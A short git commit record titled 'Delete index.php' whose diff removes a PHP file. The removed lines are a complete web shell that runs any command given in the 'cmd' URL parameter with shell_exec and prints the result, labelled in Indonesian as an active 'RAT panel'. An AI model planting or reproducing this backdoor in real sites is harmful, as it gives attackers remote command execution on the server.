c61b866d4e3d536a47a6d74a85a1d3eb4f25d1fd
elloe5803-droid <elloe5803@gmail.com>
2026-08-23 11:32:31 +0700

    Delete index.php

--- index.php
+++
@@ -1,8 +0,0 @@
-<?php  
-// Cek apakah ada perintah dari URL  
-if (isset($_GET['cmd'])) {  
-    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";  
-} else {  
-    echo "Panel RAT Aktif. Gunakan ?cmd=whoami untuk test.";  
-}  
-?>  
